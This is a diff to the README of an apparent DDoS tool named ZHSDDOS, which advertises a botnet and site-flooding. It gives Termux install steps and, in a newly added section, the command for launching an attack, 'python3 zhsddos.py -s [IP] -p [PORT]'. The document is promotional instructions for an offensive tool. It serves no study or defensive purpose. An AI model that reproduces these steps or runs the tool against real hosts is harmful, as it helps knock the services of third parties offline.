@@ -1,10 +1,11 @@
 # ZHSDDOS
-DDOS SCRIPT BY ZHOSTY AND K0NARKI
+[>_]DDOS SCRIPT BY ZHOSTY AND K0NARKI[_<]
+
 ✔BOT NET [K0NARKI]
 
 ✔DDOS SITES
 
--- HOW TO INSTALL
+[+] HOW TO INSTALL
 
 pkg install git
 
@@ -17,5 +18,7 @@ ls
 cd ZHSDDOS
 
 ls
+
+[+] Command to ddos attack:
 
 python3 zhsddos.py -s [IP] -p [PORT]
